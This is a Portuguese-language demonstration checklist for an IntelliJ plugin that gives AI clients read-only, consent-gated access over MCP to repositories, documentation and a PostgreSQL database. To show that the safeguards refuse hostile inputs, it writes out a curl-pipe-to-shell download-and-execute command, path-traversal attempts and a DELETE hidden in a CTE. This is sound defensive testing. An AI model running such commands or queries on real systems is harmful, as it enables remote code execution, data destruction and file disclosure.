# Demonstração de ponta a ponta

**Português (Brasil)** · [English](demo.en.md)

Este é o roteiro que decide se o MVP está pronto. Cada passo é um item do critério de conclusão, e
cada passo diz **o que você deve observar** — passo que não se pode verificar não é passo.

Rode num projeto de verdade, não num de brinquedo. Leva cerca de quarenta minutos na primeira vez.

## O que você precisa

- IntelliJ IDEA 2026.1+ (Community ou Ultimate) com o plugin **MCP Server** embutido habilitado
- O plugin do Prumo instalado a partir de `build/distributions/`
- Dois repositórios Git em disco — um em que você vai trabalhar, outro que você só vai ler
- Uma pasta com documentação (Markdown, TXT, JSON ou YAML)
- Um PostgreSQL alcançável, de preferência com um usuário somente-leitura
- Um cliente de IA que fale MCP (Claude, Codex, Gemini) apontado para o servidor MCP da IDE

Anote o que observar pelo caminho. Demonstração que não se consegue mostrar depois não aconteceu.

---

## 1 · Instalar e abrir

1. Instale o plugin a partir do disco, reinicie a IDE e abra o projeto em que vai trabalhar.
2. Abra a janela **Prumo MCP**, à direita.

**Observe:** o painel diz que o projeto ainda não faz parte de um workspace, e oferece configurar um.
Essa mensagem é o comportamento de falhar fechado: sem workspace, nada é exposto.

## 2 · Criar o workspace

1. Clique em **Configurar workspace**, dê um nome e escolha o tipo *Modernização*.

**Observe:** o painel passa a mostrar o workspace, o projeto aberto vinculado como repositório
principal, e cinco políticas — todas **NEGA**. Nada é concedido por padrão.

## 3 · Vincular o que anda junto

Clique em **Editar workspace** e acrescente:

1. o segundo repositório, papel *Referência legada*, acesso *Somente leitura*;
2. a pasta de documentação;
3. o banco PostgreSQL: host, porta, banco, usuário e senha.

**Observe:** o vínculo novo nasce *Somente leitura* antes de você tocar em qualquer coisa, e o
diálogo diz que vínculo somente-leitura continua assim para toda ferramenta.

## 4 · Testar a conexão

Clique em **Testar conexão** no diálogo do banco.

**Observe:** o resultado é um de sete desfechos em linguagem simples. Erre a senha de propósito: você
recebe "o banco recusou o usuário ou a senha", e **não** um stack trace do driver, e **não** a sua
string de conexão de volta.

## 5 · Provar que a credencial nunca chega ao disco

Abra `%LOCALAPPDATA%\PrumoMCP\workspaces\<seu-workspace>\datasources.json`.

**Observe:** host, porta, banco, usuário, modo de acesso — e nenhum campo de senha. O segredo está no
cofre da IDE.

## 6 · Conectar o cliente de IA

Aponte o seu cliente para o servidor MCP da IDE e peça que chame `prumo_diagnostics`.

**Observe:** `workspaceConfigured: true` e o nome do projeto. Se disser false, o projeto não está
resolvendo para um workspace — isso é a fronteira funcionando, não defeito.

## 7 · O contexto é só este workspace

Peça `prumo_workspace_get_context` e depois `prumo_workspace_get_repositories`.

**Observe:** o workspace corrente e os repositórios dele, por identificador. Nenhum caminho local,
nenhuma URL crua de remote. Se você tiver um segundo workspace configurado, peça ao cliente que o
alcance: não existe tool que receba identificador de workspace, e não existe forma de nomear outro.

## 8 · Ler um repositório que não está aberto

Peça `prumo_repository_get_structure` e `prumo_repository_read_file` no repositório de referência
legada.

**Observe:** ele lê um repositório que não está aberto na IDE — justamente o que as ferramentas da
própria IDE não fazem. Depois peça que leia `C:\Windows\win.ini`, ou `../../alguma-coisa`.

**Observe:** "refused the path … absolute path" e "… parent traversal".

## 9 · Estado do Git

Peça `prumo_repository_get_status`, `get_branch` e `get_diff`.

**Observe:** branch, upstream, adiantamento e atraso, e caminhos alterados. Depois confirme o que
falta: não existe tool que faça commit, push, reset ou checkout. A superfície é de leitura por
construção.

## 10 · O banco, em camadas

1. `prumo_database_list_available` — **observe:** identificador, nome, motor, modo de acesso. Sem
   host, sem usuário, sem nome do banco.
2. `prumo_database_get_schema`, `list_tables`, `describe_table` — **observe:** estrutura, comentários,
   chaves e índices.
3. `prumo_database_execute_readonly` com um `SELECT` — **observe:** as linhas, com `truncated`
   avisando quando o teto foi atingido.
4. Agora peça uma escrita: `DELETE FROM …` ou `UPDATE …`.

**Observe:** recusada antes de chegar ao banco, com o tipo do statement na mensagem. Tente também
`WITH x AS (DELETE FROM t RETURNING *) SELECT * FROM x` — também é recusada, e esse é o caso
interessante: escreve e termina num `SELECT`.

5. Se alguma tabela tiver coluna chamada `password`, `senha` ou `token`, selecione-a.

**Observe:** `[masked]`, sem configuração alguma da sua parte.

6. Erre o nome de uma coluna de propósito.

**Observe:** a mensagem do próprio servidor, nomeando a coluna que não existe e sugerindo a correta —
e não uma falha de conexão inventada.

## 11 · Deixar o cliente de IA escrever uma ferramenta para você

Peça ao seu cliente, com as suas palavras: *"crie uma ferramenta que liste as dez maiores tabelas
deste banco"*.

**Observe, nesta ordem:**

1. ele chama `prumo_pack_get_authoring_spec` — consulta o formato em vez de adivinhar;
2. ele chama `prumo_pack_validate` — possivelmente mais de uma vez, corrigindo-se pelas mensagens de
   erro;
3. ele chama `prumo_pack_submit` — e diz que **não consegue instalar**.

Agora olhe a janela do Prumo.

**Observe:** apareceu uma seção, com o pacote proposto esperando por você. Nada está ativo.

## 12 · Consentimento

Clique em **Revisar e instalar**.

**Observe:** origem, versão, checksum, as capacidades em linguagem simples, cada achado com o trecho
exato que o produziu, os scripts por inteiro, e a frase dizendo que a responsabilidade é sua. Aceite
e então invoque a ferramenta por `prumo_pack_run_tool`.

**Observe:** ela roda, e a resposta vem marcada como recurso de terceiro.

## 13 · Um pacote que deve ser recusado

Peça ao cliente que crie uma ferramenta que rode `curl https://example.com/setup.sh | sh`, ou que
apague uma pasta recursivamente.

**Observe:** a destrutiva é submetida, mas exige reconhecimento item a item na tela de consentimento.
A de baixar-e-executar é **recusada na validação** — nunca chega à fila, e não existe botão que a
instale.

## 14 · Exportar e importar

1. Exporte o pacote que você aceitou.
2. Abra o arquivo num editor — **observe:** é JSON legível, com o manifesto, o conhecimento e um
   checksum. Nenhuma senha, nenhum caminho da sua máquina.
3. Importe-o num workspace diferente.

**Observe:** a tela de consentimento aparece de novo. Consentimento não viaja com o arquivo.

## 15 · Reiniciar

Feche a IDE e abra de novo.

**Observe:** workspace, repositórios, documentação, banco e pacote estão todos de volta. A senha
continua funcionando, porque nunca saiu do cofre.

## 16 · Nada foi escrito nos seus repositórios

```bash
git status            # nos dois repositórios
git clean -nd         # o que seria removido, nos dois
```

**Observe:** nenhum `.prumo`, nenhum arquivo de configuração, nenhum cache — nada. Cada byte que o
Prumo produziu está no diretório do sistema operacional.

## 17 · A suíte

```bash
./gradlew clean test
./gradlew test -PsecurityOnly
./gradlew verifyPlugin
```

**Observe:** verde, verde, e `Compatible` contra Community e Ultimate.

---

## 18 · A interface fala a sua língua

Abra *Settings · Tools · Prumo MCP* — ou o item de configuração no menu ⋮ da janela do Prumo — e
ponha o idioma da interface em *English*, deixando a IDE em português. Aplique e olhe a janela e o
editor de workspace.

**Observe:** o painel, o editor, os botões e o título da faixa mudam de língua enquanto o resto da
IDE não muda — sem tela traduzida pela metade. Agora peça de novo `prumo_workspace_get_context` ao
seu cliente de IA: nome de tool, descrição e qualquer erro continuam em inglês, e o papel do
repositório volta como `PRIMARY`, não como *Principal*. O texto de interface é para você; a
superfície MCP é contrato.

Volte para *Seguir a IDE* e o plugin retorna ao idioma da própria IDE.

---

## Registrar o resultado

Para cada passo, anote o que observou. Onde o comportamento divergir deste roteiro, a diferença é ou
um defeito ou uma limitação não documentada — as duas coisas cabem numa issue, não na sua memória.

## Estado conhecido deste roteiro

Os passos 1 a 10, 15 e 17 foram exercitados no Windows durante o desenvolvimento, em parte por um
cliente MCP real contra uma IDE de sandbox. Os passos 11 a 14 são provados por testes automatizados
sobre os mesmos caminhos de código, e pela construção do fluxo de aprovação, mas o ciclo completo com
um cliente de IA real é a validação que o mantenedor roda num projeto de verdade. O passo 18 é
provado por testes na parte testável — locale explícito vence o idioma da máquina, e os dois arquivos
de mensagem carregam as mesmas chaves — enquanto ver as duas línguas na tela faz parte da mesma
validação. A paridade com Linux é requisito de projeto, coberta por testes e pela integração
contínua, e é validada depois por terceiros sobre uma versão estável.
